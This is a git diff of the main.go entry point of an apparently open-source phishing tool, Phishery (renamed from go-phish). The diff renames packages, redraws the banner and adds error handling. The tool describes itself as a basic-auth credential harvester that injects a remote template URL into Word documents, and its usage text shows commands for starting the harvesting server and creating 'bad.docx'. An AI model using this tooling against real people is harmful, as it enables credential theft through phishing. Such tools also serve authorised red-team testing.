@@ -7,33 +7,34 @@ import (
 	"flag"
 	"fmt"
 
-	"github.com/ryhanson/go-phish/gp"
-	"github.com/ryhanson/go-phish/badocx"
+	"github.com/ryhanson/phishery/badocx"
+	"github.com/ryhanson/phishery/phish"
+	"github.com/ryhanson/phishery/neatprint"
 )
 
 const usage =
-`                              __    _      __
-     ____ _____        ____  / /_  (_)____/ /_
-    / __ \/ __ \______/ __ \/ __ \/ / ___/ __ \
-   / /_/ / /_/ /_____/ /_/ / / / / (__  ) / / /
-   \__, /\____/     / .___/_/ /_/_/____/_/ /_/
-  /____/           /_/ 	An SSL Enabled Basic Auth Credential Harvester
-			with a Word Document Template URL Injector
+`|\   \\\\__   O         __    _      __
+| \_/    o \  o  ____  / /_  (_)____/ /_  ___  _______  __
+> _   (( <_ oO  / __ \/ __ \/ / ___/ __ \/ _ \/ ___/ / / /
+| / \__+___/   / /_/ / / / / (__  ) / / /  __/ /  / /_/ /
+|/     |/     / .___/_/ /_/_/____/_/ /_/\___/_/   \__, /
+             /_/ Basic Auth Credential Harvester (____/
+                 with Word Doc Template Injector
 
-  Start the server  : go-phish -s settings.json -c credentials.json
-  Inject a template : go-phish -u https://secure.site.local/docs -i good.docx -o bad.docx
+  Start the server  : phishery -s settings.json -c credentials.json
+  Inject a template : phishery -u https://secure.site.local/docs -i good.docx -o bad.docx
 
   Options:
     -h, --help      Show usage and exit.
     -v              Show version and exit.
     -s              The JSON settings file used to setup the server. [default: "settings.json"]
     -c              The JSON file to store harvested credentials. [default: "credentials.json"]
-    -u              The go-phish URL to use as the Word document template.
+    -u              The phishery URL to use as the Word document template.
     -i              The Word .docx file to inject with a template URL.
     -o              The new Word .docx file with the injected template URL.
 `
 
-var np = gp.NeatPrint{}
+var neat = neatprint.NewNeatPrint()
 
 func main() {
 	var (
@@ -48,7 +49,7 @@ func main() {
 	flag.Parse()
 
 	if *flVersion {
-		np.Info("go-phish version: " + gp.VERSION)
+		neat.Info("phishery version: " + phish.VERSION)
 		os.Exit(0)
 	}
 
@@ -61,41 +62,45 @@ func main() {
 	go func(){
 		<-c
 		fmt.Println()
-		np.Event("Stopping auth server...")
+		neat.Event("Stopping auth server...")
 		os.Exit(1)
 	}()
 
-	gp.StartNewServer(*flSettings, *flCredentials)
+	err := phish.StartPhishery(*flSettings, *flCredentials)
+	if err != nil {
+		neat.Error("Error starting Phishery server: %s", err)
+		os.Exit(1)
+	}
 }
 
 func createBadocx(url string, in string, out string) {
 	if url == "" || in == "" || out == "" {
-		np.Error("Word .docx files and URL are required!")
-		np.Info("Usage: go-phish -u https://secure.site.local/docs -i good.docx -o bad.docx")
+		neat.Error("Word .docx files and URL are required!")
+		neat.Info("Usage: phishery -u https://secure.site.local/docs -i good.docx -o bad.docx")
 		os.Exit(0)
 	}
 
-	np.Event("Opening Word document: " + in)
+	neat.Event("Opening Word document: %s", in)
 	wordDocx, err := badocx.OpenDocx(in)
 	if err != nil {
-		np.Error("Error opening word document: " + err.Error())
+		neat.Error("Error opening word document: %s", err.Error())
 		os.Exit(1)
 	}
 
-	np.Event("Setting Word document template to: " + url)
+	neat.Event("Setting Word document template to: %s", url)
 	wordDocx.SetTemplate(url)
 
-	np.Event("Saving injected Word document to: " + out)
+	neat.Event("Saving injected Word document to: %s", out)
 	if err := wordDocx.WriteBadocx(out); err != nil {
-		np.Error("Error injecting Word doc: " + err.Error())
+		neat.Error("Error injecting Word doc: %s", err)
 		os.Exit(1)
 	}
 
 	if err := wordDocx.Close(); err != nil {
-		np.Error("Error closing injected Word doc: " + err.Error())
+		neat.Error("Error closing injected Word doc: %s", err)
 		os.Exit(1)
 	}
 
-	np.Info("Injected Word document has been saved!")
+	neat.Info("Injected Word document has been saved!")
 	os.Exit(0)
 }
